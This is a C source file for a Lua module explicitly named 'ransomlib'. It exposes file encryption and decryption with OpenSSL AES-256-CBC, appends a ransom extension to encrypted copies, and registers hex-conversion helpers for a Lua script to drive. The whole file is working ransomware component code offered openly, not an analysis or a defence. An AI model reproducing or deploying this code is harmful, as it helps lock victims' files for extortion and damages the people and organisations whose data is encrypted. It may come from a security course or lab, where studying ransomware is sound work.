#include "../lua/lua.h"
#include "../lua/lualib.h"
#include "../lua/lauxlib.h"

#include "ransomlib.h"

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
{
    for (size_t i = 0; i < size; i++) {
        hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
    }
    return 0;
}

int hexa_to_bytes(const char hex_string[], unsigned char val[], int size)
{
    const char *pos = hex_string;

    for (size_t count = 0; count < size; count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2;
    }
    return 0;
}

int encrypt(const unsigned char *key, const unsigned char *iv, const char *plaintext_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(plaintext_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char encrypted_file[1024];
    snprintf(encrypted_file,sizeof(encrypted_file),"%s%s",plaintext_file,ENCRYPT_EXT);
    //printf("encrypting : %s\n",encrypted_file);
    FILE *fOUT = fopen(encrypted_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }
    
    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {   
    	if(!EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
			handleErrors();}

	fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
	num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    }
    if(1 != EVP_EncryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);
   
    fclose(fIN);
    fclose(fOUT);

    return 0;
}

int decrypt( const unsigned char *key, const unsigned char *iv, const char *cipher_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(cipher_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char plaintext_file[1024];
    snprintf(plaintext_file,strlen(cipher_file)-(EXT_LEN)+1,"%s",cipher_file);
    FILE *fOUT = fopen(plaintext_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }


    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {
        if(!EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
                        handleErrors();}

        fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);
 
    }
   if(1 != EVP_DecryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    /* Clean up */
    fclose(fOUT);
    fclose(fIN);
    EVP_CIPHER_CTX_free(ctx);

    return 0;
}

// hex_str = bytes_to_hexa(bytes_str)
int lua_bytes_to_hexa(lua_State *L) {
    const unsigned char *bytes_str = (const unsigned char*)luaL_checkstring(L, 1);
    int len = lua_rawlen(L, 1);

    char *hex_str = malloc(len * 2 + 1);
    if (hex_str == NULL)
        return luaL_error(L, "Failed to allocate memory for hex string");

    if (bytes_to_hexa(bytes_str, hex_str, len) != 0) {
        free(hex_str);
        return luaL_error(L, "Failed to convert byte array to hex string");
    }

    lua_pushstring(L, hex_str);
    free(hex_str);
    return 1;
}

// bytes_str = hexa_to_bytes(hex_str)
int lua_hexa_to_bytes(lua_State *L) {
    const char *hex_str = luaL_checkstring(L, 1);
    int len = lua_rawlen(L, 1);

    if (len % 2 != 0)
        return luaL_error(L, "Input hex string length must be even");

    int byte_count = len / 2;
    unsigned char *byte_array = (unsigned char *)malloc(byte_count);
    if (byte_array == NULL)
        return luaL_error(L, "Failed to allocate memory for byte array");

    if (hexa_to_bytes(hex_str, byte_array, byte_count) != 0) {
        free(byte_array);
        return luaL_error(L, "Failed to convert hex string to bytes");
    }

    lua_pushlstring(L, (const char *)byte_array, byte_count);
    free(byte_array);
    return 1;
}

// encrypt(file)
int lua_encrypt(lua_State *L) {
    const char *pf  = luaL_checkstring(L, 2);

    lua_getfield(L, 1, "key");
    const char *key = luaL_checkstring(L, 3);

    lua_getfield(L, 1, "iv");
    const char *iv = luaL_checkstring(L, 4);

    encrypt((const unsigned char*)key, (const unsigned char*)iv, pf);
    return 0;
}

// decrypt(file)
int lua_decrypt(lua_State *L) {
    const char *cf  = luaL_checkstring(L, 2);

    lua_getfield(L, 1, "key");
    const char *key = luaL_checkstring(L, 3);

    lua_getfield(L, 1, "iv");
    const char *iv = luaL_checkstring(L, 4);

    decrypt((const unsigned char*)key, (const unsigned char*)iv, cf);
    return 0;
}

static const struct luaL_Reg ransomlib [] = {
    {"hexa_to_bytes", lua_hexa_to_bytes},
    {"bytes_to_hexa", lua_bytes_to_hexa},
    {"encrypt"      , lua_encrypt},
    {"decrypt"      , lua_decrypt},
    {NULL           , NULL}
};

int luaopen_ransomlib(lua_State *L)
{
    luaL_newlib(L, ransomlib);
    lua_pushvalue(L, -1);
    lua_pushstring(L, ENCRYPT_EXT);
    lua_setfield(L, -2, "ext");
    lua_setglobal(L, "ransomlib");
    return 1;
}
